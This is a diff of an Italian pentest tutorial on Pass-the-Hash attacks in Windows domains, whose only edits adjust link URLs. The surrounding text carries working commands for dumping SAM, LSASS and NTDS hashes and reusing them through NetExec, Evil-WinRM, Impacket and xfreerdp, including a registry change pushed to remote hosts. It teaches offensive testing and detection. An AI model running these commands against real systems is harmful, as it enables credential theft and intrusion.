@@ -23,9 +23,9 @@ Pass-the-Hash è la tecnica chiave per il lateral movement in ambienti Windows: 
 
 ## Cos'è Pass-the-Hash — Per Chi Parte da Zero
 
-Quando accedi a un computer Windows con la tua password, il sistema non la salva in chiaro. La trasforma in un **hash NTLM** — una stringa esadecimale di 32 caratteri che rappresenta la tua password in forma irreversibile. Fin qui tutto bene: è un meccanismo di sicurezza. Il problema è che il protocollo di autenticazione NTLM (usato da [SMB](https://hackita.it/articoli/smb), [WinRM](https://hackita.it/articoli/porta-5985-winrm), [RDP](https://hackita.it/articoli/porta-3389-rdp) e altri servizi Windows) non richiede la password in chiaro per autenticarsi — **accetta direttamente l'hash**. Questo significa che se un attaccante riesce a ottenere il tuo hash NTLM, può usarlo per accedere a qualsiasi servizio dove il tuo account è autorizzato, senza mai dover crackare la password.
+Quando accedi a un computer Windows con la tua password, il sistema non la salva in chiaro. La trasforma in un **hash NTLM** — una stringa esadecimale di 32 caratteri che rappresenta la tua password in forma irreversibile. Fin qui tutto bene: è un meccanismo di sicurezza. Il problema è che il protocollo di autenticazione NTLM (usato da [SMB](https://hackita.it/articoli/smb/), [WinRM](https://hackita.it/articoli/porta-5985-winrm/), [RDP](https://hackita.it/articoli/porta-3389-rdp/) e altri servizi Windows) non richiede la password in chiaro per autenticarsi — **accetta direttamente l'hash**. Questo significa che se un attaccante riesce a ottenere il tuo hash NTLM, può usarlo per accedere a qualsiasi servizio dove il tuo account è autorizzato, senza mai dover crackare la password.
 
-In pratica: rubo l'hash di un Domain Admin → lo uso per connettermi a ogni macchina del dominio. Niente brute force, niente [Hashcat](https://hackita.it/articoli/hashcat), niente attesa. L'hash **è** la credenziale.
+In pratica: rubo l'hash di un Domain Admin → lo uso per connettermi a ogni macchina del dominio. Niente brute force, niente [Hashcat](https://hackita.it/articoli/hashcat/), niente attesa. L'hash **è** la credenziale.
 
 ## Come Funziona l'Autenticazione NTLM
 
@@ -43,7 +43,7 @@ Client                           Server (SMB, WinRM, RDP NLA...)
 └──────────────┘                └──────────────────────────┘
 ```
 
-Il punto chiave è nel terzo passaggio: il client prende l'hash NTLM della password e lo combina con il challenge del server per creare la response. Il server fa lo stesso calcolo con l'hash che ha salvato nel proprio database (SAM locale o [Active Directory](https://hackita.it/articoli/active-directory) NTDS.dit). Se corrispondono → accesso concesso. **In nessun momento la password in chiaro viene trasmessa o necessaria.**
+Il punto chiave è nel terzo passaggio: il client prende l'hash NTLM della password e lo combina con il challenge del server per creare la response. Il server fa lo stesso calcolo con l'hash che ha salvato nel proprio database (SAM locale o [Active Directory](https://hackita.it/articoli/active-directory/) NTDS.dit). Se corrispondono → accesso concesso. **In nessun momento la password in chiaro viene trasmessa o necessaria.**
 
 Questo è il motivo per cui PtH funziona: se hai l'hash, puoi calcolare la response corretta senza conoscere la password.
 
@@ -61,7 +61,7 @@ reg save HKLM\SAM C:\Windows\Temp\sam
 reg save HKLM\SYSTEM C:\Windows\Temp\system
 ```
 
-Scarica i file e usa [Impacket](https://hackita.it/articoli/impacket) per estrarre gli hash:
+Scarica i file e usa [Impacket](https://hackita.it/articoli/impacket/) per estrarre gli hash:
 
 ```bash
 impacket-secretsdump -sam sam -system system LOCAL
@@ -79,7 +79,7 @@ L'hash LM (`aad3b435b51404eeaad3b435b51404ee`) è vuoto — significa che LM has
 
 ### 2. LSASS — Hash dalla Memoria
 
-LSASS (Local Security Authority Subsystem Service) è il processo Windows che gestisce le autenticazioni. Ogni utente che fa login su una macchina lascia il proprio hash NTLM nella memoria di LSASS. [Mimikatz](https://hackita.it/articoli/mimikatz) è lo strumento standard per estrarlo.
+LSASS (Local Security Authority Subsystem Service) è il processo Windows che gestisce le autenticazioni. Ogni utente che fa login su una macchina lascia il proprio hash NTLM nella memoria di LSASS. [Mimikatz](https://hackita.it/articoli/mimikatz/) è lo strumento standard per estrarlo.
 
 ```
 mimikatz # privilege::debug
@@ -94,7 +94,7 @@ Domain            : CORP
 NTLM              : 5f4dcc3b5aa765d61d8327deb882cf99
 ```
 
-Questo funziona anche da remoto con [Evil-WinRM](https://hackita.it/articoli/porta-5985-winrm):
+Questo funziona anche da remoto con [Evil-WinRM](https://hackita.it/articoli/porta-5985-winrm/):
 
 ```bash
 evil-winrm -i 10.10.10.40 -u administrator -p 'Corp2025!'
@@ -119,11 +119,11 @@ j.rossi:1103:aad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
 svc_sql:1105:aad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::
 ```
 
-Per la tecnica [DCSync](https://hackita.it/articoli/dcsync) completa — l'hash di `krbtgt` permette il Golden Ticket.
+Per la tecnica [DCSync](https://hackita.it/articoli/dcsync/) completa — l'hash di `krbtgt` permette il Golden Ticket.
 
 ### 4. Responder — Hash dalla Rete
 
-[Responder](https://hackita.it/articoli/responder) cattura hash NTLMv2 dalla rete avvelenando le risposte LLMNR/NBT-NS. Questi hash **non** sono direttamente utilizzabili per PtH (sono challenge-response, non hash puri), ma possono essere craccati con [Hashcat](https://hackita.it/articoli/hashcat) per ottenere la password → dalla password calcoli l'hash NTLM puro → PtH.
+[Responder](https://hackita.it/articoli/responder/) cattura hash NTLMv2 dalla rete avvelenando le risposte LLMNR/NBT-NS. Questi hash **non** sono direttamente utilizzabili per PtH (sono challenge-response, non hash puri), ma possono essere craccati con [Hashcat](https://hackita.it/articoli/hashcat/) per ottenere la password → dalla password calcoli l'hash NTLM puro → PtH.
 
 ```bash
 hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
@@ -133,14 +133,14 @@ hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
 
 * **Dump SAM da backup** — file `C:\Windows\Repair\SAM` e `SYSTEM`
 * **Volume Shadow Copy** — `vssadmin create shadow /for=C:` → copia SAM/NTDS.dit dalla shadow
-* **[Kerberoasting](https://hackita.it/articoli/kerberoasting)** → hash dei service account → crack → password → hash NTLM
+* **[Kerberoasting](https://hackita.it/articoli/kerberos/)** → hash dei service account → crack → password → hash NTLM
 * **NTDS.dit da backup** — backup del Domain Controller
 
 ## Pass-the-Hash in Pratica — Tool per Tool
 
 ### NetExec — Il Coltellino Svizzero
 
-[NetExec](https://hackita.it/articoli/netexec) (NXC) è lo strumento più versatile per PtH. Supporta SMB, WinRM, RDP, LDAP, SSH, MSSQL.
+[NetExec](https://hackita.it/articoli/netexec/) (NXC) è lo strumento più versatile per PtH. Supporta SMB, WinRM, RDP, LDAP, SSH, MSSQL.
 
 ```bash
 # PtH via SMB — verifica credenziali
@@ -171,7 +171,7 @@ SMB  10.10.10.43  445  FILE-01   [+] CORP\administrator (Pwn3d!)
 SMB  10.10.10.44  445  DEV-01    [-] CORP\administrator STATUS_LOGON_FAILURE
 ```
 
-4 macchine su 5 compromesse con un singolo hash. Questa è la potenza del PtH. Volendo si puà usare anche [crackmapexec](https://hackita.it/articoli/crackmapexec)
+4 macchine su 5 compromesse con un singolo hash. Questa è la potenza del PtH. Volendo si puà usare anche [crackmapexec](https://hackita.it/articoli/crackmapexec/)
 
 ```bash
 # Esegui un comando su tutte le macchine compromesse
@@ -200,7 +200,7 @@ evil-winrm -i 10.10.10.40 -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
 corp\administrator
 ```
 
-Shell PowerShell completa. Da qui: [Mimikatz](https://hackita.it/articoli/mimikatz), [BloodHound](https://hackita.it/articoli/active-directory), dump SAM, [DCSync](https://hackita.it/articoli/dcsync).
+Shell PowerShell completa. Da qui: [Mimikatz](https://hackita.it/articoli/mimikatz/), [BloodHound](https://hackita.it/articoli/active-directory/), dump SAM, [DCSync](https://hackita.it/articoli/dcsync/).
 
 ### Impacket — La Suite Completa
 
@@ -255,7 +255,7 @@ Enter-PSSession DC-01
 xfreerdp /v:10.10.10.40 /u:administrator /pth:32ed87bdb5fdc5e9cba88547376818d4 /d:CORP
 ```
 
-PtH su [RDP](https://hackita.it/articoli/porta-3389-rdp) funziona solo se Restricted Admin Mode è attivo. Per abilitarlo da remoto (se hai già accesso):
+PtH su [RDP](https://hackita.it/articoli/porta-3389-rdp/) funziona solo se Restricted Admin Mode è attivo. Per abilitarlo da remoto (se hai già accesso):
 
 ```bash
 crackmapexec smb 10.10.10.40 -u administrator -H 'HASH' -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0 /f'
@@ -291,7 +291,7 @@ Ecco come si svolge un attacco Pass-the-Hash reale in un penetration test Active
 
 Il PtH è devastante in ambienti dove:
 
-* L'**Administrator locale** ha la stessa password su tutte le macchine (no [LAPS](https://hackita.it/articoli/active-directory))
+* L'**Administrator locale** ha la stessa password su tutte le macchine (no [LAPS](https://hackita.it/articoli/active-directory/))
 * I **service account** usano la stessa password ovunque
 * Gli **utenti** riutilizzano la password del dominio su servizi locali
 
@@ -301,9 +301,9 @@ Un singolo hash Administrator locale → accesso a 50, 100, 500 macchine. Questo
 
 | Protocollo | Porta                                                                                                           | PtH funziona?             | Tool                      |
 | ---------- | --------------------------------------------------------------------------------------------------------------- | ------------------------- | ------------------------- |
-| **SMB**    | [445](https://hackita.it/articoli/smb)                                                                          | Sì (sempre)               | CME, Impacket, Mimikatz   |
-| **WinRM**  | [5985](https://hackita.it/articoli/porta-5985-winrm)/[5986](https://hackita.it/articoli/porta-5986-winrm-https) | Sì                        | Evil-WinRM, CME           |
-| **RDP**    | [3389](https://hackita.it/articoli/porta-3389-rdp)                                                              | Solo con Restricted Admin | xfreerdp                  |
+| **SMB**    | [445](https://hackita.it/articoli/smb/)                                                                          | Sì (sempre)               | CME, Impacket, Mimikatz   |
+| **WinRM**  | [5985](https://hackita.it/articoli/porta-5985-winrm/)/[5986](https://hackita.it/articoli/porta-5986-winrm-https/) | Sì                        | Evil-WinRM, CME           |
+| **RDP**    | [3389](https://hackita.it/articoli/porta-3389-rdp/)                                                              | Solo con Restricted Admin | xfreerdp                  |
 | **LDAP**   | 389/636                                                                                                         | Sì                        | CME, ldapsearch           |
 | **MSSQL**  | 1433                                                                                                            | Sì                        | CME, Impacket-mssqlclient |
 | **WMI**    | 135                                                                                                             | Sì                        | Impacket-wmiexec          |
@@ -346,7 +346,7 @@ Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} |
 ## FAQ — Domande Frequenti su Pass-the-Hash
 
 **Pass-the-Hash funziona con hash NTLMv2?**
-No. Gli hash NTLMv2 catturati da [Responder](https://hackita.it/articoli/responder) sono challenge-response, non hash puri. Devi prima crackarli con [Hashcat](https://hackita.it/articoli/hashcat) (mode 5600) per ottenere la password, poi calcolare l'hash NTLM puro.
+No. Gli hash NTLMv2 catturati da [Responder](https://hackita.it/articoli/responder/) sono challenge-response, non hash puri. Devi prima crackarli con [Hashcat](https://hackita.it/articoli/hashcat/) (mode 5600) per ottenere la password, poi calcolare l'hash NTLM puro.
 
 **Posso fare PtH con un hash di account locale verso un'altra macchina?**
 Sì, se l'account locale ha lo stesso username e password hash sull'altra macchina. Questo è il caso classico dell'Administrator locale con password uguale su tutte le workstation.
